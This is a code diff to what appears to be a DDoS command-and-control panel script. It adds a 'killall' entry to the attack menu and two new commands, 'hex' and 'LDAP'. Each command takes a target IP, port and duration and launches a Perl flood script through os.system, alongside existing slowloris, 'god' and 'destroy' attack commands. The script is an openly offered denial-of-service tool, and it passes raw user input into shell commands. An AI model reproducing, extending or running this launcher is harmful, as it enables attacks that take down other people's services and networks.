@@ -156,8 +156,8 @@ def special():
                                 \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mkillall             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<vse>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
@@ -296,6 +296,16 @@ def main():
                 print('Usage: slowloris <ip> <port>')
                 print('Example: slowloris 1.1.1.1 80')
 
+        elif "hex" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl hex.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: hex <ip> <port> <time>')
+                print('Example: hex 1.1.1.1 80 60')
+
         elif "god" in cnc:
             try:
                 ip = cnc.split()[1]
@@ -315,6 +325,16 @@ def main():
             except IndexError:
                 print('Usage: destroy <ip> <port> <time>')
                 print('Example: destroy 1.1.1.1 80 60')
+
+        elif "LDAP" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl LDAP.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: LDAP <ip> <port> <time>')
+                print('Example: LDAP 1.1.1.1 80 60')
 
         elif "std" in cnc:
             try:
